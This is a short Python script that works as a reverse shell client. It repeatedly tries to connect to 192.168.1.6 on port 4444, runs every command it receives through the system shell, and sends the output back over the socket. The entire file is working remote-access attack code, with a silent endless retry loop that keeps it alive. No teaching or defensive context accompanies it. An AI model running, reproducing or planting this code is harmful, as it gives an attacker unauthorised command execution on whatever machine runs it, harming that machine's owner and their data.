import socket
import time
import subprocess
import os


def send_result(shell_result):
    sock.send(shell_result.encode())



def recv_command():
    while True:
        command = sock.recv(1024).decode().strip()
        print(command)
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        else:
            shell_result = ''
            shell_run = subprocess.run(command, capture_output=True, text=True, shell=True)
            shell_result = shell_result + str(shell_run.stdout) + str(shell_run.stderr)
            send_result(shell_result)


def server_communication():
    recv_command()


def server_connection():
    try:
        time.sleep(10)
        sock.connect((server_ip, port))
        server_communication()
    except:
        server_connection()


server_ip = '192.168.1.6'
port = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_connection()